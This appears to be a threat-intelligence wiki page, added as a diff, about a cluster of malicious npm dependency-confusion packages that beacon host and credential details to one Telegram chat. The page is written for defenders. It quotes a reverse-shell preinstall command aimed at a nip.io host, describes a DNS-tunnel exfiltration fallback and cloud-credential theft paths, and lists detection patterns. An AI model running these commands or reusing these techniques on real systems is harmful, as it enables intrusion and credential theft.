@@ -1,0 +1,62 @@
+# The Telegram `chat_id 1064260758` cluster: ~10 dependency-confusion-shaped npm packages all beacon installer identity + credential-shaped env-var NAMES to one Telegram chat — most README-self-labeled "security research PoCs," one with a DNS-tunnel fallback to `dc-callback.example.com` (Amazon Inspector via OSV, Sep 21, 2026)
+
+## Tags
+- ops
+- npm
+- supply-chain
+- malicious-package
+- dependency-confusion
+- scope-squat
+- reconnaissance
+- exfiltration
+- Telegram
+- DNS-tunneling
+- install-script
+- Amazon-Inspector
+- OSV
+- AWS-metadata
+
+## Summary
+
+A September 21, 2026 (~04:00 UTC) OSV batch sourced to Amazon Inspector exposes a single operator template reused across at least nine npm packages: `siriusbeyond`, `@siriusbeyond/auth`, `@siriusbeyond/ui`, `@siriusbeyond/utils` (`MAL-2026-16343/16320/16321/16322`), `commerce-materials`, `byted-commerce-materials` (`MAL-2026-16330/16326`), `starbucks-sdk` (`MAL-2026-16345`), and `@dbbhk/ui-components` (`MAL-2026-16319`) — all shipping a `callback.js` on preinstall+postinstall that collects installer host identity plus **the names (not values) of credential-shaped environment variables**, POSTs the report to `api.telegram.org/bot<token>/sendMessage`, and **all ship to the same `chat_id 1064260758`**. Several publish under a README self-label of "dependency confusion PoC / security research" — the same canary-vs-recon ambiguity this wiki logged for [`@pwaplatform/module-sso-integration`](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) one day earlier, now as a fleet. The `@dbbhk/ui-components` variant escalates past fingerprinting: it pulls **AWS IMDSv2-style instance metadata, ECS task-role credentials, `~/.aws/credentials`, `.npmrc`, and the Kubernetes service-account token** — actual credential-VALUES, under an "HSBC bug-bounty PoC" self-label. The `@siriusbeyond`/`commerce-materials` variants carry a **DNS-tunnel fallback: base64-encodes host/user/CI fields into `<blob>.dc-callback.example.com` and issues `dns.resolve()`** for environments that block Telegram. Registry state at this wiki's Sep 21 check: all nine names **still live** with versions attached (created Sep 20 00:29–09:27 UTC, one Sep 21 01:07 UTC).
+
+## Confirmed mechanics (from the `MAL-2026-163xx` Amazon Inspector analyses)
+
+- **Template:** `package.json` declares `preinstall` and `postinstall` → `node callback.js 2>/dev/null || true` (stderr suppression keeps the beacon out of install output and survives failures). Version `99.0.0` under a plausible-corporate scope = the canonical dependency-confusion resolution shape: an internal build referencing the private scope resolves to the public high-numbered version.
+- **Collection (base template):** `os.hostname()`, `os.userInfo().username`, platform/arch/release, cwd, homedir, uid/gid, network interfaces, CI/cloud-provider fingerprints (GitHub Actions/GitLab/Jenkins env tells), npm registry config; then `process.env` keys filtered against ~14–35 credential regexes (`token|secret|key|password|auth|api|aws|azure|gcp|npm|git|docker|registry|artifactory|nexus|jwt|stripe|slack|discord|webhook|…`), up to 10–20 matches. Several variants also probe cwd for `.env`, `.npmrc`, `.yarnrc`, `.git/config`, `.docker/config.json`, `credentials`, `secrets.json` and report which exist.
+- **Exfil:** POST to `https://api.telegram.org/bot<token>/sendMessage` (Markdown-formatted report), hardcoded bot tokens (Inspector names `8636277735` and `8605555117` across variants), **chat_id `1064260758` common to all**.
+- **DNS fallback (`siriusbeyond`, `@siriusbeyond/*`, `commerce-materials`, `byted-commerce-materials`):** base64 of host/user/CI fields → `dns.resolve()` of `<blob>.dc-callback.example.com`. The domain does not resolve publicly at this wiki's Sep 21 check (subdomains would be queried against the parent zone regardless — hunt on the parent).
+- **Credential-value escalation (`@dbbhk/ui-components@99.0.0`):** queries `169.254.169.254` for IAM role credentials, reads `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (ECS task role), iterates env for AWS/SECRET/KEY/TOKEN/PASSWORD/CREDENTIAL/AUTH/API/NPM/GITHUB/GITLAB variables **with values**, reads `~/.aws/credentials`, `/root/.aws/credentials`, `.env`, `.npmrc`, and `/var/run/secrets/kubernetes.io/serviceaccount/token`. Header comment self-labels an HSBC bug-bounty PoC; scope `@dbbhk` impersonates an HSBC-adjacent internal component. **Whatever the intent label, this one ships full cloud-credential theft.**
+- **No observed second stage** in any variant: destination is a chat log, not a payload channel. This is a target-qualification fleet — same posture as the [algamil7x DNS cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md): every install tells the operator who/where/which-secrets-surface before anything is committed.
+
+## Registry state (live checks by this wiki, Sep 21 ~05:25 UTC)
+
+All still **LIVE** with versions attached, none deprecated: `siriusbeyond@1.0.0` (created Sep 20 01:10 UTC), `@siriusbeyond/auth|ui|utils@99.0.0` (Sep 20 08:59 UTC), `@dbbhk/ui-components@99.0.0` (Sep 20 09:27 UTC), `byted-commerce-materials@1.0.0` + `commerce-materials@1.0.0` (Sep 20 01:23/01:24 UTC), `starbucks-sdk@1.0.0` (Sep 20 00:29 UTC). These names resolve and install **today**, malware-class advisories published or landing, no takedown — the third consecutive day this wiki records npm serving advised malware (`@pwaplatform/module-sso-integration` and `@insiderintelligence/googleadmanager` both still live at the same check).
+
+## Same intake window, different clusters (do not merge)
+
+The same Sep 21 Inspector batch also carried distinct, lower-grade sets, recorded here to keep them separable:
+- **nip.io reverse-shell squats:** `@nimbusedge2/auth|xa|xsas|xsas1`, `@nimbsuedge3/xar` — preinstall `bash -i >& /dev/tcp/147.93.157.202.nip.io/8080` (nip.io wildcard-DNS wrapper around a bare IP) plus output piped to a hardcoded **canarytokens.com** contact URL (`MAL-2026-16301–16306`). Host 147.93.157.202:8080 did not answer at this wiki's check. Interactive reverse shells with canary-token confirmation read as opportunistic squat-tests, not the Telegram fleet's fingerprint.
+- **webhook.site/Pipedream beacon stubs:** `keroeltop`/`keroeltopgg`/`keroeltopkk`/`keroeltopkkk`, `test12vv36`, `test1df23`, `test1gg234`, `test1hh235`, `test1ro`, `test1sdsd2`, `chat-adapter-matrix`, `pf23727`, `pf25133`, `pf25262`, `pflag14570`, `pflag29424`, `feed-widget-helper`, `npmscript_tesstalert_unpkg` — one-liner beacons to `eo8f3m8ho…pipedream.net`, `128.199.122.145`, or `webhook.site` UUIDs; the `pf*`/`pflag*` set fetches `/profile`-shaped paths and greps for `DGA{...}`/flag-shaped tokens = CTF/bounty self-scanning artifacts. Bulk unpublished at this wiki's check.
+- **Client-side skimmers:** `my-cdn-script@1.0.0` — injects a fake card form into an **Alpha Bank (Greece) hosted payment method**, POSTs card+PII byte-encoded behind a `image/png`-typed Blob to `https://ungpkg.top/gate`, and gates itself off when PrestaShop admin cookies are present so the merchant never sees it; `homestack-cheer@1.1.9` — **dual-entrypoint smuggling**: benign UMD `main` (hello-world greet) vs malicious ESM `module` ending in `new Function(atob(~180KB))`, which only fires when webpack/rollup bundle the package into a production app, then swaps the real Stripe iframe for a `__privateStripeFrame84331` look-alike on checkout pages. `ungpkg.top` returned Cloudflare 522 at this wiki's check. These target the victim's customers, not the installer — a different victim model from the recon fleet.
+
+## Why it matters (durable reads)
+
+1. **Env-var-NAME disclosure is a targeting map, not a leak.** The base fleet never reads values — but "this host has `AWS_SECRET_ACCESS_KEY` + `NPM_TOKEN` + a `.env` in cwd" is everything an operator needs to pick which beaconed host deserves a real payload. Treat name-disclosure recon clusters as pre-stage, exactly as DNS-label beaconing.
+2. **`api.telegram.org/bot<token>/sendMessage` remains npm malware's default exfil because it looks like nothing:** allow-listed domain, valid TLS, one POST. Egress controls that permit Telegram (most consumer-facing hosts) cannot constrain it. Durable hunt: outbound `api.telegram.org/bot*` from **build/CI hosts** at all — no legitimate npm dependency needs it.
+3. **`chat_id` is the cluster key.** One integer stitches nine differently-named packages into one operator across four apparent personas (siriusbeyond, byted/commerce, starbucks, dbbhk/HSBC) — pivot on chat IDs the way you pivot on C2 IPs. Same logic applies to the bot tokens Inspector names.
+4. **"Security research PoC" self-labels at fleet scale devalue the label.** One self-labeled canary is ambiguous; ten self-labeled canaries that all exfil to ONE private chat the researcher controls is indistinguishable from a recon fleet — and the `@dbbhk` variant reads cloud credential VALUES while wearing the same label. The wiki's standing triage rule stands: **treat canary/PoC claims as untrusted metadata; behavior is the artifact.**
+5. **The DNS fallback to an unregistered parent (`dc-callback.example.com`) is a dead switch — but the resolution ATTEMPT is the signal.** Queries for `*.dc-callback.example.com` appear in resolver logs even though nothing resolves; it's a free, durable beacon-of-the-beacon indicator for every host that installed the fleet.
+6. **Dependency-confusion `99.x` versioning against plausible internal scopes is running as a commodity campaign now**, three-plus org-targeted waves in one week (T-Bank/pwaplatform, this fleet, the HSBC-shaped `@dbbhk` squat). Private scopes should be actually private; lockfile/CI resolution logs are where this class is visible.
+
+## Hunt guidance
+
+- **Network:** any `api.telegram.org/bot<token>/sendMessage` POST from build/CI/dev hosts; DNS queries for `*.dc-callback.example.com` (no answers expected); DNS to `*.nip.io` from npm install processes (the `147.93.157.202.nip.io` set).
+- **Static:** `callback.js` fired from preinstall+postinstall with `2>/dev/null || true`; env-key regex blocks matching `/token|secret|key|pass|auth|api|aws/i`; lifecycle names `callback.js`, files probing `dc-callback.example.com` or `chat_id 1064260758`.
+- **Audit:** lockfiles/CI-resolution logs for the nine live names at listed versions (Sep 20+); anything resolving scopes `@siriusbeyond`, `@dbbhk`, `@nimbusedge2`, `@nimbsuedge3`, `@baanx` not on an internal allow-list.
+- **Post-exposure:** if a build host installed the fleet, rotate what its env-name inventory exposed (the names told the operator what to steal next) and treat `@dbbhk/ui-components` installs as credential compromise (IMDS/ECS/K8s SA token + `~/.aws/credentials` read = rotate IAM keys, task roles, and SA tokens).
+
+## See also
+
+- [The `algamil7x` npm DNS-exfil recon cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — prior week, same recon posture via DNS labels; Sep 21 section adds the sixth member confirmed from the live tarball.
+- [The `npmjs.it.com` Gradle-masquerade agent pair](npmjs-it-com-gradle-masquerade-full-rce-agent-pair-september-2026.md) — same Inspector batch, actual remote-access payload instead of recon.
